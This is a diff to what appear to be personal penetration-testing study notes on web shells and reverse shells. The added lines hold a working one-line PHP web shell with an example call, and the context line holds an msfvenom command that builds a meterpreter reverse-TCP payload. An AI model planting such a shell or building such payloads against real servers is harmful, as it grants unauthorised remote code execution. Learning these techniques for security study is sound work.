@@ -92,4 +92,17 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10
 - a script that runs inside a webserver, which executes code on the server.
 - after uploading vulnerability, we can execute that file directly on the server with the command of our desire in the `url`
 >[!Demo] 
+> shell.php file
+> `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+> call the file with the command from url
+> `/shell.php?cmd=whoami`
+
+>[!Takeaway]
+>Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
+
+
+
+
+
+
 
